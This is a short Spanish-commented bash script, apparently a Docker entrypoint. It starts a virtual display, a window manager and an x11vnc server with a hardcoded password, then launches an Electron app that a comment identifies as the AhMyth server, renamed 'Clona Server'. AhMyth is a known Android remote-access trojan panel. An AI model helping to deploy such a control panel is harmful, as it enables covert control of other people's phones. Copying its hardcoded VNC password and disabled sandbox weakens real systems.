#!/bin/bash
# 0. Limpiar archivos de bloqueo antiguos (Crucial para Docker)
rm -f /tmp/.X99-lock
rm -rf /tmp/.X11-unix/X99

# 1. Iniciar pantalla virtual FULL HD
echo "Iniciando pantalla virtual Xvfb..."
Xvfb :99 -screen 0 1920x1080x24 -ac +extension GLX +render -noreset &
export DISPLAY=:99

# Esperar a que la pantalla esté realmente lista antes de seguir
echo "Esperando a que Xvfb esté listo..."
for i in {1..20}; do
    if xdpyinfo -display :99 >/dev/null 2>&1; then
        echo "Xvfb listo!"
        break
    fi
    sleep 0.5
done

# 2. Iniciar administrador de ventanas
fluxbox &
sleep 1

# 3. Iniciar servidor VNC (Puerto 5900)
# -shared permite múltiples conexiones de diferentes máquinas
# -ncache 10 mejora el rendimiento en conexiones lentas
echo "Iniciando x11vnc..."
x11vnc -display :99 -forever -passwd "clona123" -rfbport 5900 -shared -noxdamage -repeat -ncache 10 &
sleep 2

# 4. Iniciar el servidor de AhMyth
echo "Iniciando Clona Server..."
electron /app --no-sandbox

